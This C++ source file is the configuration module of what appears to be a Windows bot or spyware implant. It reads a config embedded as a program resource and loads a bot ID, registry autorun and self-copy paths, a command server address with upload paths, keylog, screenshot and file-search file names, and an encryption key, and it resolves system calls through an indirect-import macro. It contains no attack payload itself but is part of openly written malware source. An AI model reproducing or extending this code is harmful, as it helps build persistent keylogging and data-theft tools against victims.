#include "config.h"


char* GetNextLine(char* pbData, int iDataSize, int* pointer);
bool lineInCurrentSection(char*pbData, int iDataSize, int* pointer);
char *getKey(char *line);
char *getValue(char *line);
bool lineContainSection(char *line);
char* getSection(char *line);

void Config::init(){}
void Config::unit(){}
Config::Config(){}
Config::Config(char* pcData, int iDataSize){
	Config::loadData(pcData, iDataSize);
}
char* Config::get(char*section, char*key) {
	return Config::config.get(section, key);
}
HashMap Config::getConfig(){
	return Config::config;
}
void Config::LoadFileInResource(int name, int type, DWORD& size, char*& data)
{
	HMODULE handle = CWA(kernel32, GetModuleHandle)(NULL);
	HRSRC rc = CWA(kernel32, FindResource)(handle,MAKEINTRESOURCE (name),MAKEINTRESOURCE(type));
	HGLOBAL rcData = CWA(kernel32, LoadResource)(handle, rc);
	size = SizeofResource(handle, rc);
	data = (char*)(CWA(kernel32, LockResource)(rcData));
	
}
char* GetNextLine(char*pbData, int iDataSize, int* pointer){
	// get next line and increase pointer
	char * line = NULL;
	int startLine = *pointer;
	int endLine = startLine;
	while (endLine < iDataSize && (pbData[endLine] != '\n')){
		endLine++;
	}
	// increase pointer
	*pointer += endLine - startLine+1;
	while (endLine > startLine && pbData[endLine] == '\r'){ endLine--; }
	

	if (endLine != startLine){

		line = new char[endLine - startLine + 1];
		for (int j = startLine; j < endLine; j++){
			//printf("%02x ", pbData[j]);
			line[j - startLine] = pbData[j];
		}
		line[endLine - startLine] = 0;
		
	}
	return line;
}
bool lineInCurrentSection(char*pbData, int iDataSize, int* pointer){
	// get next line and increase pointer
	bool check = true;
	if (*pointer >= iDataSize || (*pointer < iDataSize && pbData[*pointer] == '['))	check = false;
	return check;
}
char *getKey(char *line){
	// printf("Line contain key: %s\r\n", line);
	char *key = NULL;
	int start = -1;
	int end = -1;
	int lineLength = strlen(line);
	int i = 0;
	while (i < lineLength && line[i] == ' ') i++;
	if (i < lineLength && line[i] != ' ') start = i;
	while (i < lineLength && line[i] != '=') i++;
	//i--;
	while (i < lineLength && line[i] == ' ') i--;
	end = i-1;
	//printf("start-end = %d-%d\r\n", start, end);
	if (start >= 0 && end >start){
		key = new char[end - start+1];
		for (int j = start; j < end; j++){
			key[j - start] = line[j];
		}
		key[end - start] = 0;
	}
	return key;
}
char *getValue(char *line){
	char *value = NULL;
	int start = -1;
	int end = -1;
	int lineLength = strlen(line);
	int i = 0;
	while (i < lineLength-1 && line[i] == '=') i++;
	while (i < lineLength && line[i] != '"') i++;
	if (i < lineLength && line[i] != '"') i++;
	if (i < lineLength - 1) {
		start = i + 1;
		i = start;
	}
	while (i < lineLength && line[i] != '"') i++;
	if (i < lineLength && line[i] == '"') end = i;
	//printf("start-end = %d-%d\r\n", start, end);
	if (start > 0 && end >start){
		value = new char[end - start + 1];
		for (int j = start; j < end; j++){
			value[j - start] = line[j];
		}
		value[end - start] = 0;
	}
	return value;
}
bool lineContainSection(char *line){
	int Left = -1;
	int Right = -1;
	int lineLength = strlen(line);
	int i=0;
	while (i < lineLength && line[i] != '[') i++;
	if (i < lineLength && line[i] == '[') Left = i;
	while (i < lineLength && line[i] != ']') i++;
	if (i < lineLength && line[i] == ']') Right = i;
	// printf("[%d-%d] %s\r\n", Left, Right, line);
	return (Left >= 0 && Right > 0);
}
char* getSection(char *line){
	int Left = -1;
	int Right = -1;
	int lineLength = strlen(line);
	int i = 0;
	while (i < lineLength && line[i] != '[') i++;
	if (i < lineLength && line[i] == '[') Left = i;
	while (i < lineLength && line[i] != ']') i++;
	if (i < lineLength && line[i] == ']') Right = i;
	char *section = NULL;
	if (Left >= 0 && Right > 0){
		section = new char[Right - Left];
		for (int j = Left + 1; j < Right; j++){
			section[j - Left - 1] = line[j];
		}
		section[Right - Left-1] = 0;
	}
	return section;
}
void Config::loadData(char *pbData, int iDatasize){
	int pointer = 0;
	while (pointer < iDatasize){
		char *line = GetNextLine(pbData, iDatasize, &pointer);
		//printf("Line: %s\r\n", line);
		/**/
		if (lineContainSection(line) == true){
			char *section = getSection(line);
			//printf("Section: [%s]\r\n", section);
			do{
				char *sectionDataLine = GetNextLine(pbData, iDatasize, &pointer);
				char *key = NULL;
				char *value = NULL;
				if (sectionDataLine != NULL){
					key = getKey(sectionDataLine);
					value = getValue(sectionDataLine);
					if (key != NULL && value != NULL){
						config.put(section, key, value);
						//printf(" (%s) = |%s|\r\n", key, value);
						//printf()
					}
						
				}
				
				if (sectionDataLine != NULL) delete[] sectionDataLine;
				//if (key != NULL) delete[] key;
				//if (value != NULL) delete[] value;
			}
			while (lineInCurrentSection(pbData, iDatasize, &pointer) == true);
			//if(section != NULL) delete[] section;

		}
		if(line!=NULL) delete[]line;
	}
}
void Config::loadDataInResource(int name, int type){
	DWORD size = 0;
	char* data;
	Config::LoadFileInResource(name, type, size, data);
	// Access bytes in data - here's a simple example involving text output
	// The text stored in the resource might not be NULL terminated
	char* buffer = new char[size + 1];
	CopyMemory(buffer, data, size);
	//printf("%s\r\n", buffer);
	Config::loadData(buffer, size);
	delete[] buffer;
}
void Config::loadDataToCoreData(CORE_DATA* coreData){
	// Zero memory of bot id
	CWA(kernel32, ZeroMemory)(coreData->cBotID, sizeof(coreData->cBotID));

	// REG section
	CWA(kernel32, CopyMemory) (coreData->coreConfig.reg.KEY_PATH,
		Config::config.get("REG", "KEY_PATH"),
		strlen(Config::config.get("REG", "KEY_PATH")) + 1);
	//printf("REG-KEY_PATH=%s\r\n", coreData->coreConfig.reg.KEY_PATH);
	
	CWA(kernel32, CopyMemory) (coreData->coreConfig.reg.KEY_NAME,
		Config::config.get("REG", "KEY_NAME"),
		strlen(Config::config.get("REG", "KEY_NAME")) + 1);
	//printf("REG-KEY_NAME=%s\r\n", coreData->coreConfig.reg.KEY_NAME);
	if (Config::config.get("REG", "AUTORUN_PATH") != NULL){
		CWA(kernel32, CopyMemory) (coreData->coreConfig.reg.AUTORUN_PATH,
			Config::config.get("REG", "AUTORUN_PATH"),
			strlen(Config::config.get("REG", "AUTORUN_PATH")) + 1);
		//printf("REG-KEY_AUTORUN_PATH=%s\r\n", coreData->coreConfig.reg.AUTORUN_PATH);
	}
	
	CWA(kernel32, CopyMemory) (coreData->coreConfig.reg.AUTORUN_NAME,
		Config::config.get("REG", "AUTORUN_NAME"),
		strlen(Config::config.get("REG", "AUTORUN_NAME")) + 1);
	//printf("REG-AUTORUN_NAME=%s\r\n", coreData->coreConfig.reg.AUTORUN_NAME);
	
	CWA(kernel32, CopyMemory) (coreData->coreConfig.reg.COPY_PATH,
		Config::config.get("REG", "COPY_PATH"),
		strlen(Config::config.get("REG", "COPY_PATH")) + 1);
	//printf("REG-COPY_PATH=%s\r\n", coreData->coreConfig.reg.COPY_PATH);

	CWA(kernel32, CopyMemory) (coreData->coreConfig.reg.COPY_PATH_2000_xp,
		Config::config.get("REG", "COPY_PATH_2000_xp"),
		strlen(Config::config.get("REG", "COPY_PATH_2000_xp")) + 1);
	//printf("REG-COPY_PATH_2000_xp=%s\r\n", coreData->coreConfig.reg.COPY_PATH_2000_xp);

	// SERVER section
	wchar_t server[MAX_SERVER];
	size_t size_server = strlen(Config::config.get("SERVER", "ADDRESS")) + 1;
	size_t out_size_server;
	mbstowcs_s(&out_size_server, server, size_server, Config::config.get("SERVER", "ADDRESS"), size_server - 1);
	CWA(kernel32, CopyMemory) (coreData->coreConfig.server.ADDRESS, server, (wcslen(server) + 1)*sizeof(wchar_t));
	//wprintf(L"SERVER-ADDRESS=%s\r\n", coreData->coreConfig.server.ADDRESS);
	
	coreData->coreConfig.server.PORT = atoi(Config::config.get("SERVER", "PORT"));
	//printf("SERVER-PORT=%d\r\n", coreData->coreConfig.server.PORT);
	
	CWA(kernel32, CopyMemory) (coreData->coreConfig.server.HELLO_PATH,
		Config::config.get("SERVER", "HELLO_PATH"),
		strlen(Config::config.get("SERVER", "HELLO_PATH")) + 1);
	printf("SERVER-HELLO_PATH=%s\r\n", coreData->coreConfig.server.HELLO_PATH);

	CWA(kernel32, CopyMemory) (coreData->coreConfig.server.DATA_UPLOAD_PATH,
		Config::config.get("SERVER", "DATA_UPLOAD_PATH"),
		strlen(Config::config.get("SERVER", "DATA_UPLOAD_PATH")) + 1);
	printf("SERVER-DATA_UPLOAD_PATH=%s\r\n", coreData->coreConfig.server.DATA_UPLOAD_PATH);

	// HTTP section
	wchar_t get[MAX_HTTP];
	size_t size_get = strlen(HTTP_GET) + 1;
	size_t out_size_get;
	mbstowcs_s(&out_size_get, get, size_get, HTTP_GET, size_get - 1);
	CWA(kernel32, CopyMemory)(coreData->coreConfig.http.GET, get, (size_get)*sizeof(wchar_t));
	//wprintf(L"HTTP-GET=%s\r\n", coreData->coreConfig.http.GET);

	wchar_t post[MAX_HTTP];
	size_t size_post = strlen(HTTP_POST) + 1;
	size_t out_size_post;
	mbstowcs_s(&out_size_post, post, size_post, HTTP_POST, size_post - 1);
	CWA(kernel32, CopyMemory)(coreData->coreConfig.http.POST, post, (size_post)*sizeof(wchar_t));
	//wprintf(L"HTTP-POST=%s\r\n", coreData->coreConfig.http.POST);

	wchar_t post_head[MAX_HTTP];
	size_t size_post_head = strlen(HTTP_POST_HEAD) + 1;
	size_t out_size_post_head;
	mbstowcs_s(&out_size_post_head, post_head, size_post_head, HTTP_POST_HEAD, size_post_head - 1);
	CWA(kernel32, CopyMemory)(coreData->coreConfig.http.POST_HEAD, post_head, (size_post_head)*sizeof(wchar_t));
	//wprintf(L"HTTP-POST_HEAD=%s\r\n", coreData->coreConfig.http.POST_HEAD);

	CWA(kernel32, CopyMemory) (coreData->coreConfig.http.POST_HEAD_BEGIN,
		HTTP_POST_HEAD_BEGIN,
		strlen(HTTP_POST_HEAD_BEGIN) + 1);
	//printf("HTTP-POST_HEAD_BEGIN=%s\r\n", coreData->coreConfig.http.POST_HEAD_BEGIN);

	CWA(kernel32, CopyMemory) (coreData->coreConfig.http.POST_HEAD_END,
		HTTP_POST_HEAD_END,
		strlen(HTTP_POST_HEAD_END) + 1);
	//printf("HTTP-POST_HEAD_END=%s\r\n", coreData->coreConfig.http.POST_HEAD_END);

	// FILE section
	CWA(kernel32, CopyMemory) (coreData->coreConfig.file.KEYLOG,
		Config::config.get("FILE", "KEYLOG"),
		strlen(Config::config.get("FILE", "KEYLOG")) + 1);
	//printf("file-KEYLOG=%s\r\n", coreData->coreConfig.file.KEYLOG);

	CWA(kernel32, CopyMemory) (coreData->coreConfig.file.SEARCH,
		Config::config.get("FILE", "SEARCH"),
		strlen(Config::config.get("FILE", "SEARCH")) + 1);
	//printf("file-SEARCH=%s\r\n", coreData->coreConfig.file.SEARCH);

	CWA(kernel32, CopyMemory) (coreData->coreConfig.file.SEARCH_UPLOADED,
		Config::config.get("FILE", "SEARCH_UPLOADED"),
		strlen(Config::config.get("FILE", "SEARCH_UPLOADED")) + 1);
	//printf("file-SEARCH_UPLOADED=%s\r\n", coreData->coreConfig.file.SEARCH_UPLOADED);

	CWA(kernel32, CopyMemory) (coreData->coreConfig.file.SCREENSHOT,
		Config::config.get("FILE", "SCREENSHOT"),
		strlen(Config::config.get("FILE", "SCREENSHOT")) + 1);
	//printf("file-SCREENSHOT=%s\r\n", coreData->coreConfig.file.SCREENSHOT);

	// KEY section
	CWA(kernel32, CopyMemory) (coreData->coreConfig.key.key,
		Config::config.get("KEY", "KEY"),
		strlen(Config::config.get("KEY", "KEY")) + 1);
	//printf("KEY-KEY=%s\r\n", coreData->coreConfig.key.key);
	/**/
}